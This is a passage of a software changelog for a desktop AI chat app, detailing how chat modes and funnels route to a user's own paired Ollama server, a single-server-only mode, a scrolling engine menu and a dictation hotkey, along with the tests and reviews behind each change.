    be imported in the test environment it prints a SKIPPED banner and
    records nothing; the app's venv has it, so a skip means that run
    didn't test what it should.
- Privacy is as before: only the goal and the option's label go out, to
  the search the funnel already used. The page loads each picture
  straight from its https URL, as before, now with
  `referrerpolicy="no-referrer"` like the answers' photos.
- Saved chats: a funnel saves its goal, each "question → pick" and the
  summary (6b322), never the option cards, so a picture arriving late
  changes nothing saved. A reloaded funnel shows those lines, as before.
- Gauntlet: the section exec'd alone on a stand-in search (the filters,
  the queries and their order, the og:image fallback, no two alike,
  exclude, side by side, the budget), the retry loop run in node on a
  stand-in page and clock (the waits, five then a tile, a failed load
  replaced, a duplicate refused, stopping with the stage, the funnel or
  the card, the jitter, an adult card), pins for the grid, the box and
  the wiring, the safe-search engines and their settings, the word and
  host lists (with the examples above), no search for an adult label
  (counted on a stubbed search), the two-search cap with a slow stub, and
  69 mutations, each caught. Live: the route refuses without the launch
  key or the token, and answers an adult label with no search.
- Left as it is: relevance is only as good as the search. An abstract
  label ("Academic Hub") can still get a loosely related photo, a blog
  header with its title across it, or a generated picture whose address
  doesn't say so.

## 6b339 — your server first in Fast, Thinking and Pro
Patrick (2026-09-30): "if I pick thinking, then, or at least under funnel,
it's not using my server at all. So make sure that if a user picks fast,
thinking, or pro, that the models that are on their server, it prioritizes
those over the ones that are on their local device." Then, of funnels: "in
funnel mode, between the effort levels, it's only using my Mac apparently
and not using the server. So it should intelligently, again, if the models
it's using are available on the server, go to those first as they're
presumably faster. And if the server has any more suitable models, it
should run those. Be intelligent, be smart." And: "keep cloud first in
funnels, But under the effort selection between fast and normal, add a
checkbox, include cloud models. And if that's turned on, it'll use or
prioritize the cloud models. If that's turned off, then it just goes to
server models first, followed by local models."

Nothing resolved to the server before: `resolve_tier`, the agents and the
funnel's hardcoded label all looked at this computer only (6b334 kept a
server out of every mode on purpose; an explicit pick and "<name> Only"
keep their no-fallback rule unchanged). A MODE means "the best available",
so here falling back IS allowed.
- **What may be used unasked** (`server_mode_candidates`): a paired server
  of the active profile that the person hasn't turned off (Settings ›
  Your servers › "Use for Fast, Thinking and Pro", on by default, saved
  with the server in servers.json, `POST /api/servers/prefer`), that
  answered its last check, and models whose placement is "gpu" AND that
  fit the card (`_srv_fits`, 6b337: the gateway's `placement` is the
  owner's policy, not a measurement). Never "gpu+ram" (the desktop's CPU
  is unstable under that load, see the RAM test notes), never an unknown
  placement. Before a mode resolves, a server last checked over a minute
  ago is asked again, 5 s at most, side by side (`server_refresh_modes`);
  one found down less than a minute ago is left alone, so a server that is
  off costs one wait a minute, not one a question.
- **The ladder: SERVER FIRST** (`resolve_tier_seats`, `resolve_agent_seat`).
  A seat is {label, fb, params}: the model (a server's "<name> · <tag>" or a
  local one) and `fb`, what answers in its place before its first word.
  The first build seated a server model only where it was the same model
  as a ladder pick or a bigger one (so a Mac that holds Gemma 4 26B never
  touched the server); the reviewers called that narrower than Patrick
  asked, and he ruled (his words above: "it prioritizes those over the ones
  that are on their local device"; "if the server has any more suitable
  models, it should run those"): for each seat in Fast, Thinking and Pro the
  server's best suitable model, meaning role-ok, placement "gpu", fitting a
  card whose size the gateway REPORTED, the per-server switch on and the
  server answering, is used BEFORE any local model. The seats the server
  can't fill (Thinking wants three and the server has two) are the tier's
  local picks in their normal order. A server model with the same Ollama tag
  as a local pick replaces it (the catalog row's tag against the server's,
  whole, ":latest" as the bare name; the MLX and the Ollama build of a model
  are one model here), and its `fb` is that local copy when it is
  installed, else the mode's first local seat. Among the server's models
  the ranking stays role-aware, quality and size first, measured speed as
  the tiebreak. The trade-off, stated plainly: a modest model on the server
  now outranks a stronger local one (a 14B on the card can be Fast while the
  Mac holds a 26B), which is what "server first" means; the per-server
  "Use for Fast, Thinking and Pro" switch is the way back to local-first for
  anyone who prefers their own models, and Fast with cloud power on still
  asks the cloud first, as before. The composer chip names the routing
  ("Fast · Ollama1 gpt-oss:20b", "Thinking · Ollama1 ×3").
- **The chooser, shared by the modes, the Code lane and funnels**
  (`srv_role_ok`, `srv_rank`). Families come from the tag's own words,
  whole words only ("pro" in "llama-prompt-guard" once seated a
  classifier on every council): words are the tag's `[a-z0-9]+` runs and
  their letter stems ("guard3" is a guard, "qwen2.5vl" a picture reader).
  coder: coder, code, codellama, codegemma, codestral, starcoder(2),
  devstral, codeqwen, deepcoder, opencoder. embedding: embed(ding(s)), bge,
  gte, e5, nomic, minilm, mxbai, rerank(er), sentence. picture reader:
  llava, bakllava, moondream, vision, minicpm, pixtral, paligemma,
  internvl, smolvlm, vl. guard: guard, guardian, shieldgemma, safeguard,
  classifier, moderation. reasoning distill: r1, qwq, magistral, reasoning,
  reasoner, thinking. Rules: a coder, an embedding, a picture reader or a
  guard model never takes a general seat (the Code lane takes a coder
  first, and any general model after one); a reasoning distill takes
  Thinking and Pro but not Fast and not a funnel (a stage must come back as
  strict JSON without seconds of hidden thinking). "normal" wants the
  strongest (parameter size, unknown sizes last, then measured speed);
  "fast" wants a quick, competent instruction model: 7-15B, the faster
  measured one first then the larger; below the band the larger, above it
  the smaller. MEASURED SPEED (`server_speeds`): the usage ledger this app
  already keeps has each server call under its label with output tokens
  and milliseconds (w "server"); the median of the recent calls with 30+
  counted tokens, loads included, is the tokens a second. No new store.
- **Running.** Fast: the cloud first when cloud power is on (unchanged: the
  speed ladder), then the server seat, then this Mac's (`server_first_answer`).
  A seat has a FIRST-WORD DEADLINE (30 s for Fast and a funnel's fast
  effort, 60 s otherwise; `server_first_deadline`, read by `server_stream`):
  a pick the person made and "<name> Only" keep the long wait (a model load
  can take minutes), a seat doesn't, so a slow server is left for this
  Mac's copy. A failure before the first word marks the server DOWN for a
  minute (`server_mark_down`; later stages, councils and funnels skip it,
  its memory pass and place pins aren't asked again, and a check that
  succeeds clears it), the page is told to drop what it holds (RESET), the
  status line says "<name> didn't answer, so <model> answers here", a RUN
  frame `{w: "local", m: <model>}` makes the badge say "this Mac" (the page
  used to keep the server's name); after a word there is one answer, cut
  there and said. Fast's SECOND PASS (draft then rewrite, on search and
  recommendation questions) runs on the same server inside the same
  deadline; a server that fails during it keeps the first draft, without
  alarm (a partial rewrite is wiped and the draft shown). A chat whose mode
  seated a server is titled by that server when it answered, or by none
  when it fell back (`server_seat_title`); never by a model on this Mac. Never another server, never a cloud
  model it wasn't going to use. Councils (Thinking, Pro, Advanced): server
  drafts run in PARALLEL with this Mac's and the cloud's, one thread per
  server, its models one after another (one card), the same 120 s per model
  and 240 s for the loop, each inside the 60 s first-word deadline, so a
  slow server is simply absent; a failed draft is absent (the straggler
  rule) and marks its server down. Peer review, reflection and a server
  merge carry the deadline too, and peer review and reflection on a
  server's model run within the per-model cap (they were uncapped). The compositor (superseded for a mode by 6b344: its merge is the server's strongest suitable model, preferring one it
  holds; what follows is still the rule for an Advanced council): when the merger is a model
  the server also has and it fits, the merge is written there, this Mac's
  copy behind it (a failed server merge is wiped and this Mac writes it;
  none: the best draft ships); a pen named in Advanced stays as named. The
  memory pass goes to the answering model; titles follow the old rules. A
  picture in a mode still goes to the vision ladder (a server seat never
  reads it). The pre-warm is skipped for a server seat (route `(None,
  None)`), so the Mac's engine isn't loaded for an answer the server gives.
- **Covered:** Chat's Fast, Thinking and Pro; the Code lane's agents
  (Coding and Workspace prefer a server coder, else the server's copy of
  their first pick) and the other agents that answer through the ordinary
  path; funnels' stages, retry and verdict; `/api/tiers` (the bubble lists
  a server's models with "· your server"). **Not covered, on purpose:**
  the Research agent (its writer must be a local engine it can search
  with) and the Remote agent's driver (per-turn fallback over SSH isn't
  designed); titles, exports and the image refiner (old rules).
- **Funnels** (`funnel_stage`, the verdict in `/api/funnel`). Order: cloud
  (the effort's ladder, exactly as 6b308, only when the box is ticked AND
  cloud power is on with a key), then the server (`server_funnel_pick`,
  the same chooser: "fast" the quick 7-15B instruction model, "normal" the
  strongest general model that fits the card whole; for the verdict always
  "normal"), then this Mac's own ladder. "Include cloud models" sits
  directly under the Fast / Normal radios, ticked by default (today's
  behaviour), saved like the effort (`funnel_cloud`, a synced setting with
  a True/False check, remembered by the page), sent with EVERY stage so an
  open funnel respects a change at the next one. Unticked: NO cloud call
  anywhere in a funnel: not the stage, not the retry on the work ladder
  (replaced by one walk onto this Mac when the server's stage failed the
  gate), not the verdict, not the audit (cloud-only by design). The web
  image search for option pictures isn't a model and stays. With no cloud
  key, or cloud power off, the box is greyed, unticked-looking and says
  "no cloud keys saved"; the saved choice is kept for when keys return.
  The `engine` the reply records says which model ran ("server:<name> ·
  <tag>", "local:<label>", or the cloud model) for `quality.jsonl` and the
  drill tooling; the verdict's reply now carries it too.
- **The rules review and the UX review of this branch** (fixed in the same
  round; the decisions are the coordinator's and Patrick's). "<name> Only"
  makes NO picture or video (no FLUX, no saved Gemini key, no model asked to
  word a follow-up prompt: `image_followup(refine=False)`; one line, "<name>
  Only can't make pictures or videos, and nothing was made", before the
  benchmark hold) and runs NO agent ("<name> Only can't run the <agent>
  agent, and nothing was run"; the page turns an Only pick off when an
  agent is chosen, so the Code lane doesn't quietly drop it). A PLAIN
  explicit server pick keeps 6b334's behaviour (local FLUX or a saved
  Gemini key; only the prompt goes), chosen on purpose. Cloud Only never
  contacts the server (no refresh before it, none for Research or Remote,
  which run their own flows). The funnel's cloud choice is ANDed with the
  saved `funnel_cloud` on the server, so an omitted field or a page that
  hadn't read the setting can't turn cloud on against a saved OFF, and the
  page's load-versus-change race is gone (`fnCloudTouched`; the flag is
  sent only once the page has read the setting). "<name> Only" never picks
  a guard, classifier, embedding or picture-reading model, even as the
  smallest (`srv_role_ok` "all" in both branches), and says in its bubble
  when its pick is the smallest on a server that doesn't report where its
  models run. Auto-routing (modes, funnels) requires the gateway to have
  REPORTED the card's size (`_srv_fits(..., need_vram=True)`); an explicit
  pick or Only keeps the looser rule. The memory pass and the place-pin pass
  don't ask a server that failed this turn. UX: a click on a server row a
  hover just opened keeps the flyout (`flyClick`); a pick in Advanced whose
  server dropped the model shows greyed as "no longer on <name>", can be
  unticked, is never sent, and a council of nothing else answers as Fast
  with a line saying why; funnels refresh the servers before a stage (the
  same at-most-once-a-minute rule), and `server_funnel_pick` reads no ledger
  when no server is paired; the funnel box's tooltip has its own words for
  "no cloud keys saved" and "cloud power is off".
- **The final verification review found the real page never reached the
  server's seats** (the one serious defect, and what the tests had missed).
  The page always sends `model`, the model last picked by hand ("Llama 3.2
  3B" on a fresh install, `council[0]` after `paintModels`), and `models`,
  that council, BESIDE the tier. The handler read `model` and never cleared
  it for a tier, so the route loop matched that stale label: `route_label`
  became a local model, Fast ran `lbl = route_label or model_name` (the
  stale model; never `lbl in _seat_fb`, so never the server seat), and
  Thinking and Pro pre-warmed that local engine on a Mac that should stay
  quiet. That is exactly Patrick's "I selected the pro setting and the GPU
  on the server isn't doing anything". Every earlier test posted `model: ""`
  or an explicit pick, which no page ever sends with a tier. Fixed in the
  handler: for a tier request the page's `model` is set aside
  (`_page_model`, used only if the roster is empty) and the mode answers
  from its own seats; the leader of the council is the model, so a server
  seat routes to no local engine at all. That read of `model` is older than
  this branch (the comment above it still says a tier arrives with
  `model=""`); the server seats are what it hides. Whether a Mac with no
  server ran the stale model through it on main was not measured here.
  - **The tests now send the page's own request.** A check reads the page's
    send code (`sendMsg`: `model`, `models`, `tier`, `messages`, `auto_web`,
    `images`, `docs`, `agent`, and the turn: `chat_id`, `lane`, `after_len`,
    `after_hash`) and fails if its shape moves from what the live checks
    post. Against the real gateway on its stub Ollama, a paired server
    holding six suitable models, and a copy of the app run with the
    `local-record` test hook (dev copies only: `run_model` for a model of
    this computer answers with a stub line and `ensure_mlx_engine` starts
    nothing, each noted and read at `/api/test/local`), the stale pick
    "Llama 3.2 3B" beside Fast, Thinking and Pro: the server drafts, the
    answer carries its label in `X-Models`, nothing on this computer is
    asked or warmed (Pro warms only a local seat of its own); the switch
    off runs the same request here and asks the server nothing; a funnel
    stage in the page's shape asks the server first. Two mutations (the
    stale model put back, an engine warmed for a seat) are run against
    MUTATED COPIES of the app paired to the same gateway and must fail
    those checks. The replaced pins (`_p2c_pins` seats and server-first
    shape, `_p3c_quiet` pre-warm) are gone; pins stay where nothing can
    exercise a line (a seat isn't an explicit pick, the deadline wiring,
    the title ticket).
  - **A down server's later seats** (`_run_group`): a server marked down
    by its first draft's failure or stall loses the rest of its group (they
    were each asked, one deadline apiece); the draft shows as "server down".
    Tested with a stub server that accepts and stalls: the council ends near
    one deadline.
  - **The flyout's quick click**: a click on a server's row within 300 ms of
    hovering opened the flyout, then the pending hover timer opened it again
    as a hover one and reset its scroll. `srvRowClick` clears `engSubTimer`
    first (node check, with the real timer).
  - **The switch refreshes the page**: the "Use for ..." handler also calls
    `srvModesRefresh`, `paintTierAvail` and the open menu's repaint, so the
    chip and the tiers' bubbles don't keep the old seats.
  - **Pro's server seats are capped at four** (`SRV_SEATS_MAX`): one card
    runs its models one after another and the loop gets 240 s, so only the
    first four drafts of a dozen landed. The rest are this computer's normal
    picks (or none); `/api/tiers` says `srvcap` {seated, of} where the cap
    binds and the bubble says "seats 4 of the 6 models on your server".
  - **Code lane copy**: the Workspace and Coding agents can now send the
    contents of a local folder to the paired server, as they send it to any
    model that answers. It is the person's own server, so the behaviour
    stays; the switch's label is "Use for Fast, Thinking, Pro and the Code
    lane" and a line under it says what the two agents send.
  - **The chip** names the server for Fast only when the server will answer:
    with cloud power on and a key, Fast asks the cloud first (the server
    seat is the fallback) and the chip says "Fast".
- Gauntlet: new `== your server first (6b339) ==`, eight in-process and
  node checks (the families and the ranking, the candidates and the switch,
  the seats, the failing seat, the council's parallel drafts and the merge,
  the funnel's order, the box, the pins, the rules review's refusals), each
  mutation of its list caught, and live checks on the real gateway (Cloud
  Only never seats a server model, Pro does while the switch is on and none
  with it off; "<name> Only" refuses a picture, a video and an agent
  without a model request reaching anything). The whole run on the branch
  rebased onto the funnel pictures build (6b340): 623 of 623, then 628 of
  628 after the final review's fixes. Adapted: the
  6b337 live check "no tier lists a server model" says it of Cloud Only; the
  servers' public keys gain `prefer`; `server_check`'s deadline is read at
  call time. A live chat in Fast/Thinking/Pro against the real gateway
  is run in the page's own request shape (above), with the `local-record`
  hook standing in for this computer's engines.
- Not verified here: a real GPU's measured speed (the ledger path is tested
  with canned records), WKWebView (the box and the page functions run in
  node; nothing was looked at on screen), a funnel against a real server
  (the stage and verdict run against stand-ins), and the parallel drafts'
  timing on a loaded machine (asserted with generous margins).
- **A plain server pick keeps this Mac's card quiet** (Patrick, the same
  day, of gemma4:12b on his server asked about hotels in Buenos Aires with
  web search on, which failed: "When I picked this model on Olama 1, it
  maxed out the GPU on my MacBook, and the GPU on the server was 0%.").
  The server half was the gateway's (Ollama started before the graphics
  driver and ran the model on its CPU; the gateway refused it, `gpu_spill`
  at 0%). The app half, audited call by call for a plain pick with search
  on: the SEARCH PATH (the query, weather, OpenStreetMap places, the page
  text, the photos, the ranking) calls no model at all, it is network and
  string work; the pre-warm is skipped for a server pick (route `(None,
  None)`); the local rescue is off for one; the place-pin pass and the
  memory pass already ran on the SAME server model. What did run on the
  Mac: **the chat's title** (`/api/title` -> `make_title` picks a capable
  local model and loads it, which after a failed server answer is exactly a
  big MLX engine on the Mac's GPU) and **an export's title**. Both now go to
  the same server or to none: the title ticket (6b337's, per chat) is set
  for every server pick, to the server's model when it answered and to
  nothing when it didn't; an export's title isn't written by a model for a
  server pick. Also fixed: a server pick that got no answer no longer asks
  the server a second time for the memory pass (a failed turn sent the
  chat and the memory pass, so the gateway saw the model loaded and refused
  again a few seconds later; a third request I could not account for from
  the code, it may be a menu or pane status check), and the place-pin pass
  reads a model's answer, never the app's own error line. Left alone and
  said: the image refiner (`_refine_with_model`) rewrites a picture's
  prompt with a model that is ALREADY resident on the Mac (it never loads
  one), for a picture asked of a server pick, which 6b334 lets make
  pictures on this Mac anyway; the benchmark; a local engine that some other
  chat or the Settings pane started. Retries: a server chat is signed again
  once on a replay or clock-skew refusal, and a collapsed answer (repetition)
  is asked once more with a nudge; nothing else repeats. "<name> Only"
  keeps its rule (nothing on this Mac). The text for `gpu_spill` at 0% on
  the card is "<name>'s graphics card isn't in use right now, so the model
  would have run on its CPU. It stopped." (a partial spill keeps "couldn't
  keep X in its memory"), because 0% is not a spill. Checks: the text and its
  partial, the title and memory pins with mutations, and a live run on the
  real gateway: Patrick's question with search on (every call on the one
  server model, no usage record of a local call) and the refused run (one
  request, nothing titled, nothing local).

## 6b338 — dictation hotkey
Patrick (2026-09-30): "Similar to Claude's add a hotkey for Apple D or
Command D for the speech to text. And if you hold it, you can release it
and it'll stop. But if you immediately release it, then it'll stay on
that mode until you press Command D again or whatever the Windows
equivalent is."

Command+D on a Mac, Ctrl+D on a PC (`IS_PC`). Hold it and let go: it
stops and transcribes. Tap it: dictation stays on until the hotkey (or
the mic button) is pressed again. It runs the existing path, the one the
mic button runs: `/api/speak {stop:true}`, `ensureVoice()`, `startRec`,
`stopRec`, `/api/transcribe`, `voiceChat`. A press while the engine is
not ready shows the same placeholders and doesn't record.

- **`dictKey(ev, now)`** is the whole decision, pure ("start" / "stop" /
  ""), with `dictSt = {mode, t, rep}` (`mode`: `""` idle, `"hold"`,
  `"toggle"`). The DOM glue (keydown/keyup in the capture phase, `blur`,
  `visibilitychange`) only maps events onto it, so node runs it. The
  glue (`dictStart`, `dictAct`, `stopRec`) runs in node too, on stubs.
- **Tap or hold.** On the D keyup, released at 300 ms or later is a hold
  (`DICT_HOLD_MS`). WebKit withholds the D keyup while Command is down
  and people let go of Command last, so the release often comes as the
  Command (Ctrl) keyup, which gets `DICT_HOLD_MOD_MS = 500`: a real
  push-to-talk hold lasts seconds, so the slack costs nothing. Repeat
  keydowns seen before the release make it a hold whatever the time.
  And a "hold" with under `DICT_MIN_HOLD_S = 0.4` s of audio was a tap
  after all: it stays on as a toggle rather than stopping.
- **Slips.** A stop with under `DICT_MIN_CLIP_S = 0.3` s of audio, from
  any path (hotkey, mic button, blur), is dropped in `stopRec` without
  calling `/api/transcribe`, so near-silence is never transcribed and
  never sent in voice chat. The placeholder says "didn't catch anything".
- **Edge cases.** Repeat keydowns start and stop nothing. The keyup of
  the second press lands on idle and is ignored. The hotkey stops a
  recording the mic button began (`ev.rec`), and the mic button stops
  one the hotkey began; `stopRec` sends "end", however it ended. Only
  exactly Cmd (Mac) or Ctrl (PC) counts: no Shift/Alt, and Ctrl+D on a
  Mac is left alone. A lost keyup: the next non-repeat press stops. A
  tap and a second tap while the mic is still starting: the stop waits
  in `dictPend` and runs when the start finishes.
- **Failed starts reset it.** Not ready, no microphone, blocked, or
  `api()` throwing (the server gone, a 409 profile change): every
  failed path sends "end" and clears `dictPend`, so the next press
  starts instead of stopping nothing (review of 6b338).
- **Which key.** `dictIsD(key, code)`: D by what the key types, any
  case. The physical `KeyD` counts only when `key` is not a single Latin
  letter (a Cyrillic layout), so on macOS Dvorak Command+E, which sits
  on QWERTY's D, doesn't fire it (review of 6b338).
- **Dialogs.** No START while the palette, the ZITO board or any
  `[id$="-veil"]` (Settings, Advanced, Server tasks, update, first-run,
  wizard, and the rest) is shown, and that press isn't
  `preventDefault`ed. But a press in a dialog still STOPS a recording
  and is consumed: the palette covers the mic button, and the first
  version left the mic on there (review of 6b338). A gauntlet check
  asserts every veil hides with the `hidden` attribute, which is what
  `dictModal` reads. The account window is its own native window, so
  the main page loses focus there (see below).
- **Focus.** Window `blur` or the page hiding stops and transcribes any
  recording that has started, the hotkey's or the mic button's: an open
  microphone in a background app is the worse failure (decided in the
  review, as the conservative default; Patrick hadn't answered). But
  while a start is in flight (`dictStarting`) nothing stops: that blur
  is macOS's first-use microphone prompt, and stopping lost the
  recording the moment Allow was clicked. A hold caught that way turns
  into a toggle, finished with the hotkey or the mic, and the
  placeholder says so.
- **Native menu.** Nothing in the Cocoa setup binds Cmd+D. The app passes
  no `menu=` to pywebview, which builds the default menu (pywebview
  6.2.1, the installed one): About, Hide (Cmd+H), Hide Others, Quit
  (Cmd+Q), Edit (Cmd+X/C/V/A), View (Ctrl+Cmd+F). `millenai.py` has no
  `keyEquivalent`. The page's handler calls `preventDefault` anyway.
- **Placeholder.** Hold: "listening… release to finish". Toggled, or
  started with the button: "listening… press ⌘D (or tap the mic) to
  finish" (Ctrl+D on a PC). The mic tooltip names the hotkey.

Tests: the state machine in node on timelines (18 scenarios), the glue
in node on stubs (9: the failed starts, the prompt's blur, mic-button
blur, tap-tap mid-start, slips, a short hold), then 29 mutations, each of
which must break the scenario aimed at it. Source pins on the handler,
tooltip, placeholders and path are each shown to fail when their line
changes. Driven with synthetic KeyboardEvents in a page served from a
plain file server with `api` stubbed (Blink, not WKWebView, so
unverified there: real Cmd keyup delivery, `blur` on the window and
under the real microphone prompt, Ctrl+D under WebView2).


## 6b337 — <server> Only: one model on your own server
Patrick (2026-09-30), at the engine menu: "Under the cloud models only, can
we add a Olama one only or whatever the server name is in a user's case?"
A mode per paired server: "<name> Only", a 🖥️, "strongest that fits its
card", the name the person gave the server (escaped; nothing in the app
says "ollama1"). It lives in the server's flyout, below (see "The menu").

It was first built as a council of up to three of the server's models,
the strongest writing the answer. Patrick: "Why are we doing a three model
council? … single makes more sense." He is right: one card runs the drafts
one after another with a model load between each, so three models are slow
and buy little. So it is ONE model, streamed like a single server pick:
no drafts, no compositor, no reflection, no peer review.
- **Which model.** The strongest the server lists whose placement is
  "gpu" (fits entirely on its card) and that really does, ranked by the
  parameter size in its tag (`20b` > `14b` > `9b`; `8x7b` is 56, `135m` is
  0.135, `e4b` is 4; a tag that says nothing, `:latest`, ranks last, then
  bytes, then name). "Really does": the gateway's `placement` in
  `/api/tags` is the OWNER'S POLICY (GPU-only unless the allow-list says
  `ram`), not a measurement, and a GPU-only model too big for the card is
  refused at load (`gpu_fit`; the first live run picked a 56 GiB model on
  a 16 GiB card). So when the server says how much memory its card has
  (`/v1/info`), the weights plus the gateway's margin (5%, 256 MiB, its
  768 MiB reserve and a context cache: 1.05 x size + 1.25 GiB) must fit
  in it; a model loaded and 100% on the card fits whatever its size; with
  no figure, the placement is all there is (`_srv_fits`). Embedding models
  and Ollama cloud tags are already out of the list (`_srv_models`). A
  model with placement "gpu+ram" (card + memory,
  slower) or "unknown" (a gateway that doesn't say) is NEVER picked for
  you while one fits whole; the person can still pick one by hand from the
  model rows below. Only when none fits whole is it the server's single
  SMALLEST listed model (bytes, else the tag's size), so the mode isn't
  dead; the hover bubble then says it is running with what it has.
  `server_only_pick`, `_srv_params`.
- **It follows the server.** The pick is computed from the last check
  (`server_only_state`), so it is re-evaluated whenever a check lands: the
  menu repaints (`paintEngMenuServers`), the chip changes, and a bigger
  model pulled to the server becomes the pick. A chat uses the last check
  when it is under a minute old and answered, else checks again first
  (`server_only_resolve`).
- **The tier is `srv:<server id>`.** It is saved like any tier (prefs,
  PROFILE_LOCAL, so a restart keeps it). `/api/tiers` has a row per paired
  server under that key (`available`, `models`, `server`, `model`, `how`,
  `why`, `note`), `/api/servers` has the same as `only`, and the page
  greys the row through the same `tierOff` the tiers use. Hover says
  why it is off ("<name> didn't answer…", "<name> lists no models.") or
  which model it runs, and "Nothing runs on this computer or in the
  cloud." The composer chip shows what it resolved to ("<name> · gpt-oss:20b").
- **Removed server.** The mode goes back to Fast, as a mode with nothing
  behind it does (`srvModeGone`, only once the list of servers is known),
  never to another server. A server that is merely OFF keeps the mode
  selected and greyed (a hiccup must not rewrite the person's choice); a
  chat then says so. A stale request for a server that is gone says
  "That server isn't in Settings › Your servers any more."
- **The hard rules, each pinned with a mutation.**
  - Nothing runs on this Mac or in the cloud. `/api/chat` resolves `srv:`
    to ONE label (or a placeholder "<name> · unavailable" when there is
    nothing to run on, with the reason in `_so_fail`) and the council is
    exactly that, so the existing single-server branch answers: no pre-warm
    (route is `(None, None)`), no tier line-up, no cloud ladder, no
    council, no compositor. The branch text has no `resolve_tier`,
    `run_council`, cloud or engine names. An agent that takes the council
    over ends the mode for that request.
  - A failure is said by `server_answer` and nothing answers in its
    place: the handler's local rescue is now off for any server pick
    (`not _srv_lbl`), which also closes it for 6b334's single pick.
    Nothing to run on is said too ("<reason> Nothing was sent anywhere
    else."), via `server_answer(refuse=…)`.
  - Background calls go to the same server or are skipped. The memory pass
    goes to the same server model (skipped after a refusal). The chat's
    title is written by the same server's model (`make_title(server=…)`,
    through a per-chat ticket, `_srv_only_chats`, like the cloud's) or not
    at all, never a local engine. An export's title is skipped. A place
    pin pass already goes to the answering model.
  - Pictures follow 6b334: the picked model if `/api/show` says it reads
    pictures, else another on the same server, else "<name> has no model
    that reads pictures". Making a picture or video, or a file, takes the
    benchmark hold as it does for a server pick.
  - Profiles never mix: the mode is resolved from the request's own
    profile's `servers.json`; another profile's id is "gone" there and no
    request leaves; `/api/tiers` lists only that profile's servers; the
    ticket store is a `profile_cache`.
  - Web search is untouched: the app does the lookup and only the results
    text reaches the server (the search section doesn't mention the mode).
  - A chat in the mode takes no benchmark hold (`server_only_request`):
    it uses none of this computer's engines.
- **Design choices the spec left open** (each the one most like Cloud Only
  and 6b334): the tier key is the server's id, not its name, so renaming a
  server or two servers with similar names can't cross; a server that
  has never been checked is greyed until its first check lands (a second
  or two after the app opens); "smallest" ranks by bytes first because the
  tag's size can't be read from every name; the image refiner
  (`_refine_with_model`) still uses an already-running local engine for a
  picture's prompt, as it does for a server pick today.
- **The menu** (Patrick, same day: "let's at least put all the your
  server models, in my case, Olama One, under one menu that they can
  break out into. Instead of having them pile under all the other like
  fast thinking pro cloud only, let's just have the server name ... and
  then that splits into a new menu where you can select which one.").
  Under Cloud Only there is ONE row per paired server: its name, "your
  server · N models" and a chevron. Clicking it opens a flyout beside it
  (`#engsub`): "<name> Only" first, then each of that server's models
  with its where-tag ("yours · card + memory, slower"), the chosen one
  marked. A click opens it (hover flyouts are fragile in WKWebView; a
  hover opens it after 300 ms as well, and a flyout a hover opened goes
  when the pointer moves on to another row); a second click, Esc (the
  flyout first, then the menu, before anything else reads Escape) and a
  click elsewhere close it; every pick closes both menus. It goes to the
  right of the menu, or to the left when there's no room, its top at its
  row, inside the window on every edge and capped to it so a long list
  scrolls (`flyPlace`, pure and tested in node; the same rules as 6b336);
  a repaint (`paintEngMenuServers`) keeps it open and where it was
  scrolled, and it follows its row when the menu scrolls. A server that
  isn't answering or lists none keeps its "not answering" / "no models
  listed" line in the flyout and a greyed "<name> Only". The hover bubble
  keeps to the window (to the left of its row when the right has no room).
- **Advanced** (Patrick: "they should appear under advanced where you can
  select exactly which models and council you want."). Each paired
  server's models sit in the hand-pick dialog under the server's name,
  labelled with it; a note says they draft one after another on that
  server. They are council members only: `run_council` has no server
  compositor (a label there would read as a cloud provider id), so the
  compositor list never holds one and a server label sent as the
  compositor is ignored. Mixed councils follow 6b334's rules: a server's
  models draft in turn on that server, a failed draft is absent, nothing
  falls back to local or cloud, the council is checked against this
  profile's own servers at the door (a removed server's label, or a
  model it no longer lists, is dropped, never swapped), and the merge is
  this Mac's or the cloud's as it always was. The council persists in
  prefs (`adv`); picks of a server that is paired but off at the moment
  stay when the dialog is saved; when a server is removed its picks go
  from the page's council (`advPrune`), and with none left the council
  goes and the mode is Fast.
- Gauntlet: new `== <server> Only (6b337) ==`, nine in-process and node
  checks (the pick and the card's size, the state and rows, resolving,
  the failure paths and the title, the handler's pins, the chip and
  greying, the menu and its flyout, the flyout's wiring, Advanced), 74
  mutations each caught, and ten live checks on the real gateway with a
  card for it to name (its own list, placement and size, a pick the server
  refuses said plainly, a model dropped and the mode following, a signed
  chat with cloud power on and a local model named in the request, its
  title and memory pass on the same model, a picture, an Advanced council
  of two server models with one draft absent, the server off, profile B,
  a restart and a removal). Adapted, not loosened: "no tier lists a server
  model" excludes the `srv:` rows, which are modes of their own; the
  servers' public keys gain `only`; the page's node stand-ins gain the
  functions `applyPrefs` now calls; the old flat model rows of the 6b334
  page check became the flyout's.
- Not verified here: a real GPU's placement for a real model (the
  gateway's own list is used with the stub Ollama), WKWebView and
  WebView2 (the page functions run in node; nothing was looked at on
  screen, so the flyout's look, its hover timing and its place beside the
  menu are unseen), web search with the mode on (pinned, not run live).

## 6b336 — the engine menu fits the window
Patrick (2026-09-30), with a screenshot of the engine menu listing
twelve of his server's models: "This box doesn't fit on the screen. Can
we make it scroll or go outside of the main window?" It opened upward
from the composer chip and ran off the top of the window, past the
titlebar, because `openEngMenu` only chose above or below and never
capped the height.

A page can't draw outside its window (the menu is HTML in the webview),
so it scrolls:
- It opens below the chip when the whole list fits there. Otherwise it
  opens on the side with more room, `max-height` is capped at that room
  (8 px gap to the chip, 10 px from the window edge, never under 120 px),
  and `#engmenu` scrolls (`overflow-y:auto`, `overscroll-behavior:contain`).
- On open, the chosen row is scrolled into view. A repaint while it's
  open (a server's model list refreshing) keeps the scroll position.
- Scrolling closes a mode's hover bubble, which would otherwise float
  away from its row. A window resize refits an open menu.
- `left` is clamped to the window too.

Checked on a copy of the served page at 1000×640 with twelve fake
server models: the menu ran from 10 px to 8 px above the chip, scrolled
to the last row (hit-tested with `elementFromPoint`), picked it, and on
reopening showed it. Gauntlet pins in the servers page check.

## 6b334 — your own servers: the app side (part 1)
Patrick (2026-09-29): let the app use a private Ollama server the person
owns, starting with his desktop "ollama1" at
https://ollama1.flyconcordefly.com (Cloudflare Tunnel behind Access; the
kit is 6b333). This is the app side, against `ollama1/PROTOCOL.md`.
- **Settings › Your servers** (between Models and Usage). One card per
  server: its name and host, a status line ("Paired · reachable · 142 ms ·
  Ollama 0.34.4", "Not paired · reachable", or what went wrong), its
  models, and Test, Pair (again) and Remove (a second click within 6 s
  removes it and its key). Below, Add a server: the https address, a name
  ("Desktop" by default; names are unique in a profile and never contain
  "·"), and the Access Client ID and Secret (both or neither).
